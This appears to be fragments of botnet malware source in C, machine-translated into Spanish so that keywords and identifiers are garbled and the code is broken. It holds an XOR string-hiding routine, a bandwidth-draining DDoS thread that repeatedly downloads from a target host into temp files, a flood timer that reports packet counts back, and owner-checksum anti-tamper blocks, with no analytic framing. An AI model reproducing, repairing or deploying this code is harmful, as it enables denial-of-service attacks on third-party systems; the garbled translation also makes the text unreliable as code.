/* Rutina de cripta de cadena XOR. */
char* string_hide(char* cadena,int len,char* clave){
 int key_count = 0;
 byte entero;
 char* nueva_cadena = _MALLOC(len+1,M_TEMP,M_WAITOK);
 si(nueva_cadena){
 memset(nueva_cadena,0,len+1);
 para(int i = 0;i < len;i++){
 byte = (int)cadena[i];
 byte = byte ^ (int)clave[key_count];
 memcpy((void*)(uint64_t)new_string+i,&byte,sizeof(char));
 recuento_clave++;
 if(key_count == strlen(clave)){
 recuento_clave = 0;
 }
 }
 devolver nueva_cadena;
 } 
 devolver 0;
}

/* saluda a nemo y sigilo ;-) */
char *my_strstr(char *s, char *buscar)
{
 registrar carácter c, sc;
 registrar tamaño_t len;
 si ((c = *buscar++) != 0) {
 len = strlen(buscar);
 hacer {
 hacer {
 si ((sc = *s++) == 0)
 retorno (NULO);
 } mientras (sc != c);
 } mientras (strncmp(s, buscar, len) != 0);
 s--;
 }
 devolver ((char *)s);
}

DWORD WINAPI Banda con drenaje (LPVOID)
{
 char cTargetHost[MAX_PATH];
 strcpy(cTargetHost, cFloodHost);

 mientras(bDdosOcupado)
 {
 // <!-------! ¡INICIO DEL ÁREA CRC!-------!>
 char cCheckString[POR PREDETERMINADO];
 sprintf(cCheckString, "%s--%s", cVersion, cOwner);
 char *cStr = cCheckString;
 ulCheck largo sin firmar = (((10000/100)*100)-4619);
 int nVerificar;
 mientras((nCheck = *cStr++))
 ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
 si(ulCheck!= ulChecksum2)
 romper;
 // <!-------! ¡PARADA DEL ÁREA CRC!-------!>

 srand(GenerarSemillaAleatoria());

 char cNombreDeArchivoAleatorio[MAX_PATH];
 sprintf(cRandomFileName, "%s\\B%i.tmp", cAppData, GetRandNum(899999) + 100000);

 if(DownloadUrlToFile(cTargetHost, cRandomFileName))
 Dormir(GetRandNum(4000) + 1000);

 EliminarArchivo(cNombreArchivoAleatorio);
 }

 devolver 1;
}

DWORD WINAPI NonBlockingDdosTimer (LPVOID)
{
 bool bTimerIsHttpRelated = bStoreParameter;
 bool bPacketAccountable = bStoreParameter2;

 DWORD dwTotalMillisegundos = dwStoreParameter * 1000;
 DWORD dwElapsedMillisegundos = 0;

 DWORD dwElapsedSeconds = 0;

 // <!-------! ¡INICIO DEL ÁREA CRC!-------!>
 char cCheckString[POR PREDETERMINADO];
 sprintf(cCheckString, "%s--%s", cVersion, cOwner);
 char *cStr = cCheckString;
 ulCheck largo sin firmar = (((10000/100)*100)-4619);
 int nVerificar;
 mientras((nCheck = *cStr++))
 ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
 si(ulCheck!= ulChecksum2)
 dwTotalMilisegundos = 20;
 // <!-------! ¡PARADA DEL ÁREA CRC!-------!>

 for(DWORD dwElapsedMillisegundos = 0; dwElapsedMillisegundos < dwTotalMillisegundos; dwElapsedMillisegundos++)
 {
 Dormir(1);

 if(dwElapsedMillisegundos % 1000 == 0)
 dwElapsedSeconds++;

 si(!bDdosOcupado)
 romper;
 }

 bDdosOcupado = FALSO;

 si(bTimerIsHttpRelated)
 {
#ifndef HTTP_BUILD
 SendHttpDdosStop(bPacketAccountable, dwHttpPackets, dwElapsedSeconds);
#endif
 dwHttpPackets = 0;
 }
 otra cosa
 {
#ifndef HTTP_BUILD
 SendSockDdosStop(bPacketAccountable, dwSockPackets, dwElapsedSeconds);
#endif
 dwSockPackets = 0;
 }
}
